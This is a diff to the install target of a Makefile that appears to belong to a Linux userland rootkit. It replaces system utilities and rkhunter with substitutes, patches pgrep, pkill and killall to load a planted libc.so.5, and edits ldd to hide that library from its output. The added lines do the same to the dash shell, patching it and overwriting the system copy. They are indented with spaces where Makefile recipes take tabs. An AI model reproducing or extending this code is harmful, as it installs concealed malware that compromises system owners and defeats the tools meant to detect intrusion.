@@ -65,6 +65,7 @@ install:
 	cp $(TOOLS)/readelf $$(which readelf)
 	cp $(TOOLS)/sockstat $$(which sockstat)
 	cp $(TOOLS)/apt-mark $$(which apt-mark)
+    cp $$(which dash) .
 	
 	@if which rkhunter >/dev/null 2>&1; then \
  		cp $(TOOLS)/rkhunter $$(which rkhunter); \
@@ -83,6 +84,8 @@ install:
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pgrep)
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pkill)
 	$(PATCH) $(LIBDIR)/libc.so.5 $$(which killall)
+    $(PATCH) $(LIBDIR)/libc.so.5 ./dash
+    cp -f ./dash $$(which dash)
 	
 	sed -i 's/try_trace \"$$RTLD\" \"$$file\" || result=1/try_trace \"$$RTLD\" \"$$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
 	
